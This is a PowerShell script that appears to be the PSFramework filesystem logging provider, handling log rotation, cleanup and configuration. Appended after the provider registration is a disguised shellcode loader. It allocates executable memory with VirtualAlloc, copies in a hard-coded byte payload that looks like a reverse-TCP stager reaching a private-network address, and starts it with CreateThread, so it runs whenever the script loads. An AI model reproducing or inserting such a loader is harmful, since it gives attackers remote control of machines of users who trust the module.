
$registrationEvent = {
	
}



$begin_event = {
	
	function Clean-FileSystemErrorXml
	{
		[CmdletBinding()]
		Param (
			$Path
		)
		
		$totalLength = $Null
		$files = Get-ChildItem -Path $Path.FullName -Filter "$($env:ComputerName)_$($pid)_error_*.xml" | Sort-Object LastWriteTime
		$totalLength = $files | Measure-Object Length -Sum | Select-Object -ExpandProperty Sum
		if (([PSFramework.Message.LogHost]::MaxErrorFileBytes) -gt $totalLength) { return }
		
		$removed = 0
		foreach ($file in $files)
		{
			$removed += $file.Length
			Remove-Item -Path $file.FullName -Force -Confirm:$false
			
			if (($totalLength - $removed) -lt ([PSFramework.Message.LogHost]::MaxErrorFileBytes)) { break }
		}
	}
	
	function Clean-FileSystemMessageLog
	{
		[CmdletBinding()]
		Param (
			$Path
		)
		
		if ([PSFramework.Message.LogHost]::MaxMessagefileCount -eq 0) { return }
		
		$files = Get-ChildItem -Path $Path.FullName -Filter "$($env:ComputerName)_$($pid)_message_*.log" | Sort-Object LastWriteTime
		if (([PSFramework.Message.LogHost]::MaxMessagefileCount) -ge $files.Count) { return }
		
		$removed = 0
		foreach ($file in $files)
		{
			$removed++
			Remove-Item -Path $file.FullName -Force -Confirm:$false
			
			if (($files.Count - $removed) -le ([PSFramework.Message.LogHost]::MaxMessagefileCount)) { break }
		}
	}
	
	function Clean-FileSystemGlobalLog
	{
		[CmdletBinding()]
		Param (
			$Path
		)
		
		
		Get-ChildItem -Path $Path.FullName | Where-Object Name -Match "^$([regex]::Escape($env:ComputerName))_.+" | Where-Object LastWriteTime -LT ((Get-Date) - ([PSFramework.Message.LogHost]::MaxLogFileAge)) | Remove-Item -Force -Confirm:$false
		
		
		$files = Get-ChildItem -Path $Path.FullName | Where-Object Name -Match "^$([regex]::Escape($env:ComputerName))_.+" | Sort-Object LastWriteTime
		if (-not ($files)) { return }
		$totalLength = $files | Measure-Object Length -Sum | Select-Object -ExpandProperty Sum
		
		if (([PSFramework.Message.LogHost]::MaxTotalFolderSize) -gt $totalLength) { return }
		
		$removed = 0
		foreach ($file in $files)
		{
			$removed += $file.Length
			Remove-Item -Path $file.FullName -Force -Confirm:$false
			
			if (($totalLength - $removed) -lt ([PSFramework.Message.LogHost]::MaxTotalFolderSize)) { break }
		}
	}
	
	
	$filesystem_SelectTargetObject = @{
		Name = 'TargetObject'
		Expression = {
			if ($null -eq $_.TargetObject) { return }
			if ([PSFramework.Message.LogHost]::FileSystemSerializationDepth -lt 0) { return $_.TargetObject }
			if ([PSFramework.Message.LogHost]::FileSystemSerializationDepth -eq 0) { return ($_.TargetObject | ConvertTo-PSFClixml) }
			$_.TargetObject | ConvertTo-PSFClixml -Depth ([PSFramework.Message.LogHost]::FileSystemSerializationDepth)
		}
	}
	$filesystem_SelectTimestamp = @{
		Name = 'Timestamp'
		Expression = {
			$_.Timestamp.ToString([PSFramework.Message.LogHost]::TimeFormat)
		}
	}
}


$start_event = {
	$filesystem_path = [PSFramework.Message.LogHost]::LoggingPath
	if (-not (Test-Path $filesystem_path))
	{
		$filesystem_root = New-Item $filesystem_path -ItemType Directory -Force -ErrorAction Stop
	}
	else { $filesystem_root = Get-Item -Path $filesystem_path }
	
	try { [int]$filesystem_num_Error = (Get-ChildItem -Path $filesystem_path.FullName -Filter "$($env:ComputerName)_$($pid)_error_*.xml" | Sort-Object LastWriteTime -Descending | Select-Object -First 1 -ExpandProperty Name | Select-String -Pattern "(\d+)" -AllMatches).Matches[1].Value }
	catch { }
	try { [int]$filesystem_num_Message = (Get-ChildItem -Path $filesystem_path.FullName -Filter "$($env:ComputerName)_$($pid)_message_*.log" | Sort-Object LastWriteTime -Descending | Select-Object -First 1 -ExpandProperty Name | Select-String -Pattern "(\d+)" -AllMatches).Matches[1].Value }
	catch { }
	if (-not ($filesystem_num_Error)) { $filesystem_num_Error = 0 }
	if (-not ($filesystem_num_Message)) { $filesystem_num_Message = 0 }
}


$message_Event = {
	Param (
		$Message
	)
	
	$filesystem_CurrentFile = Join-Path $filesystem_root.FullName "$($env:ComputerName)_$($pid)_message_$($filesystem_num_Message).log"
	if (Test-Path $filesystem_CurrentFile)
	{
		$filesystem_item = Get-Item $filesystem_CurrentFile
		if ($filesystem_item.Length -gt ([PSFramework.Message.LogHost]::MaxMessagefileBytes))
		{
			$filesystem_num_Message++
			$filesystem_CurrentFile = Join-Path $($filesystem_root.FullName) "$($env:ComputerName)_$($pid)_message_$($filesystem_num_Message).log"
		}
	}
	
	if ($Message)
	{
		if ([PSFramework.Message.LogHost]::FileSystemModernLog)
		{
			if (-not (Test-Path $filesystem_CurrentFile))
			{
				$Message | Select-PSFObject ComputerName, Username, $filesystem_SelectTimestamp, Level, 'LogMessage as Message', Type, FunctionName, ModuleName, File, Line, @{ n = "Tags"; e = { $_.Tags -join "," } }, $filesystem_SelectTargetObject, Runspace, @{ n = "Callstack"; e = { $_.CallStack.ToString().Split("`n") -join " þ "} } | Export-Csv -Path $filesystem_CurrentFile -NoTypeInformation
			}
			else { Add-Content -Path $filesystem_CurrentFile -Value (ConvertTo-Csv ($Message | Select-PSFObject ComputerName, Username, $filesystem_SelectTimestamp, Level, 'LogMessage as Message', Type, FunctionName, ModuleName, File, Line, @{ n = "Tags"; e = { $_.Tags -join "," } }, $filesystem_SelectTargetObject, Runspace, @{ n = "Callstack"; e = { $_.CallStack.ToString().Split("`n") -join " þ " } }) -NoTypeInformation)[1] }
		}
		else { Add-Content -Path $filesystem_CurrentFile -Value (ConvertTo-Csv ($Message | Select-PSFObject ComputerName, Timestamp, Level, 'LogMessage as Message', Type, FunctionName, ModuleName, File, Line, @{ n = "Tags"; e = { $_.Tags -join "," } }, $filesystem_SelectTargetObject, Runspace) -NoTypeInformation)[1] }
	}
}


$error_Event = {
	Param (
		$ErrorItem
	)
	
	if ($ErrorItem)
	{
		$ErrorItem | Export-Clixml -Path (Join-Path $filesystem_root.FullName "$($env:ComputerName)_$($pid)_error_$($filesystem_num_Error).xml") -Depth 3
		$filesystem_num_Error++
	}
	
	Clean-FileSystemErrorXml -Path $filesystem_root
}


$end_event = {
	Clean-FileSystemMessageLog -Path $filesystem_root
	Clean-FileSystemGlobalLog -Path $filesystem_root
}


$final_event = {
	
}




$configurationParameters = {
	$configroot = "PSFramework.Logging.FileSystem"
	
	$configurations = Get-PSFConfig -FullName "$configroot.*"
	
	$RuntimeParamDic = New-Object  System.Management.Automation.RuntimeDefinedParameterDictionary
	
	foreach ($config in $configurations)
	{
		$ParamAttrib = New-Object System.Management.Automation.ParameterAttribute
		$ParamAttrib.ParameterSetName = '__AllParameterSets'
		$AttribColl = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
		$AttribColl.Add($ParamAttrib)
		$RuntimeParam = New-Object System.Management.Automation.RuntimeDefinedParameter(($config.FullName.Replace($configroot, "").Trim(".")), $config.Value.GetType(), $AttribColl)
		
		$RuntimeParamDic.Add(($config.FullName.Replace($configroot, "").Trim(".")), $RuntimeParam)
	}
	return $RuntimeParamDic
}


$configurationScript = {
	$configroot = "PSFramework.Logging.FileSystem"
	
	$configurations = Get-PSFConfig -FullName "$configroot.*"
	
	foreach ($config in $configurations)
	{
		if ($PSBoundParameters.ContainsKey(($config.FullName.Replace($configroot, "").Trim("."))))
		{
			Set-PSFConfig -Module $config.Module -Name $config.Name -Value $PSBoundParameters[($config.FullName.Replace($configroot, "").Trim("."))]
		}
	}
}


$isInstalledScript = {
	return $true
}


$installationParameters = {
	
}


$installationScript = {
	
}



$configuration_Settings = {
	Set-PSFConfig -Module PSFramework -Name 'Logging.FileSystem.MaxMessagefileBytes' -Value 5MB -Initialize -Validation "long" -Handler { [PSFramework.Message.LogHost]::MaxMessagefileBytes = $args[0] } -Description "The maximum size of a given logfile. When reaching this limit, the file will be abandoned and a new log created. Set to 0 to not limit the size. This setting is on a per-Process basis. Runspaces share, jobs or other consoles counted separately."
	Set-PSFConfig -Module PSFramework -Name 'Logging.FileSystem.MaxMessagefileCount' -Value 5 -Initialize -Validation "integerpositive" -Handler { [PSFramework.Message.LogHost]::MaxMessagefileCount = $args[0] } -Description "The maximum number of logfiles maintained at a time. Exceeding this number will cause the oldest to be culled. Set to 0 to disable the limit. This setting is on a per-Process basis. Runspaces share, jobs or other consoles counted separately."
	Set-PSFConfig -Module PSFramework -Name 'Logging.FileSystem.MaxErrorFileBytes' -Value 20MB -Initialize -Validation "long" -Handler { [PSFramework.Message.LogHost]::MaxErrorFileBytes = $args[0] } -Description "The maximum size all error files combined may have. When this number is exceeded, the oldest entry is culled. This setting is on a per-Process basis. Runspaces share, jobs or other consoles counted separately."
	Set-PSFConfig -Module PSFramework -Name 'Logging.FileSystem.MaxTotalFolderSize' -Value 100MB -Initialize -Validation "long" -Handler { [PSFramework.Message.LogHost]::MaxTotalFolderSize = $args[0] } -Description "This is the upper limit of length all items in the log folder may have combined across all processes."
	Set-PSFConfig -Module PSFramework -Name 'Logging.FileSystem.MaxLogFileAge' -Value (New-TimeSpan -Days 7) -Initialize -Validation "timespan" -Handler { [PSFramework.Message.LogHost]::MaxLogFileAge = $args[0] } -Description "Any logfile older than this will automatically be cleansed. This setting is global."
	Set-PSFConfig -Module PSFramework -Name 'Logging.FileSystem.MessageLogFileEnabled' -Value $true -Initialize -Validation "bool" -Handler { [PSFramework.Message.LogHost]::MessageLogFileEnabled = $args[0] } -Description "Governs, whether a log file for the system messages is written. This setting is on a per-Process basis. Runspaces share, jobs or other consoles counted separately."
	Set-PSFConfig -Module PSFramework -Name 'Logging.FileSystem.ErrorLogFileEnabled' -Value $true -Initialize -Validation "bool" -Handler { [PSFramework.Message.LogHost]::ErrorLogFileEnabled = $args[0] } -Description "Governs, whether log files for errors are written. This setting is on a per-Process basis. Runspaces share, jobs or other consoles counted separately."
	Set-PSFConfig -Module PSFramework -Name 'Logging.FileSystem.ModernLog' -Value $false -Initialize -Validation "bool" -Handler { [PSFramework.Message.LogHost]::FileSystemModernLog = $args[0] } -Description "Enables the modern, more powereful version of the filesystem log, including headers and extra columns"
	Set-PSFConfig -Module PSFramework -Name 'Logging.FileSystem.LogPath' -Value $script:path_Logging -Initialize -Validation "string" -Handler { [PSFramework.Message.LogHost]::LoggingPath = $args[0] } -Description "The path where the PSFramework writes all its logs and debugging information."
	Set-PSFConfig -Module PSFramework -Name 'Logging.FileSystem.TimeFormat' -Value "$([System.Globalization.CultureInfo]::CurrentUICulture.DateTimeFormat.ShortDatePattern) $([System.Globalization.CultureInfo]::CurrentUICulture.DateTimeFormat.LongTimePattern)" -Initialize -Validation string -Handler { [PSFramework.Message.LogHost]::TimeFormat = $args[0] } -Description "The format used for timestamps in the logfile"
	Set-PSFConfig -Module PSFramework -Name 'Logging.FileSystem.TargetSerializationDepth' -Value -1 -Initialize -Validation "integer" -Handler { [PSFramework.Message.LogHost]::FileSystemSerializationDepth = $args[0] } -Description "Whether the target object should be stored as a serialized object. 0 or less will see it logged as string, 1 or greater will see it logged as compressed CLIXML."
	
	Set-PSFConfig -Module LoggingProvider -Name 'FileSystem.Enabled' -Value $true -Initialize -Validation "bool" -Handler { if ([PSFramework.Logging.ProviderHost]::Providers['filesystem']) { [PSFramework.Logging.ProviderHost]::Providers['filesystem'].Enabled = $args[0] } } -Description "Whether the logging provider should be enabled on registration"
	Set-PSFConfig -Module LoggingProvider -Name 'FileSystem.AutoInstall' -Value $false -Initialize -Validation "bool" -Handler { } -Description "Whether the logging provider should be installed on registration"
	Set-PSFConfig -Module LoggingProvider -Name 'FileSystem.InstallOptional' -Value $true -Initialize -Validation "bool" -Handler { } -Description "Whether installing the logging provider is mandatory, in order for it to be enabled"
	Set-PSFConfig -Module LoggingProvider -Name 'FileSystem.IncludeModules' -Value @() -Initialize -Validation "stringarray" -Handler { if ([PSFramework.Logging.ProviderHost]::Providers['filesystem']) { [PSFramework.Logging.ProviderHost]::Providers['filesystem'].IncludeModules = ($args[0] | Write-Output) } } -Description "Module whitelist. Only messages from listed modules will be logged"
	Set-PSFConfig -Module LoggingProvider -Name 'FileSystem.ExcludeModules' -Value @() -Initialize -Validation "stringarray" -Handler { if ([PSFramework.Logging.ProviderHost]::Providers['filesystem']) { [PSFramework.Logging.ProviderHost]::Providers['filesystem'].ExcludeModules = ($args[0] | Write-Output) } } -Description "Module blacklist. Messages from listed modules will not be logged"
	Set-PSFConfig -Module LoggingProvider -Name 'FileSystem.IncludeTags' -Value @() -Initialize -Validation "stringarray" -Handler { if ([PSFramework.Logging.ProviderHost]::Providers['filesystem']) { [PSFramework.Logging.ProviderHost]::Providers['filesystem'].IncludeTags = ($args[0] | Write-Output) } } -Description "Tag whitelist. Only messages with these tags will be logged"
	Set-PSFConfig -Module LoggingProvider -Name 'FileSystem.ExcludeTags' -Value @() -Initialize -Validation "stringarray" -Handler { if ([PSFramework.Logging.ProviderHost]::Providers['filesystem']) { [PSFramework.Logging.ProviderHost]::Providers['filesystem'].ExcludeTags = ($args[0] | Write-Output) } } -Description "Tag blacklist. Messages with these tags will not be logged"
}

Register-PSFLoggingProvider -Name "filesystem" -RegistrationEvent $registrationEvent -BeginEvent $begin_event -StartEvent $start_event -MessageEvent $message_Event -ErrorEvent $error_Event -EndEvent $end_event -FinalEvent $final_event -ConfigurationParameters $configurationParameters -ConfigurationScript $configurationScript -IsInstalledScript $isInstalledScript -InstallationScript $installationScript -InstallationParameters $installationParameters -ConfigurationSettings $configuration_Settings
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x04,0x68,0x02,0x00,0x01,0xbc,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

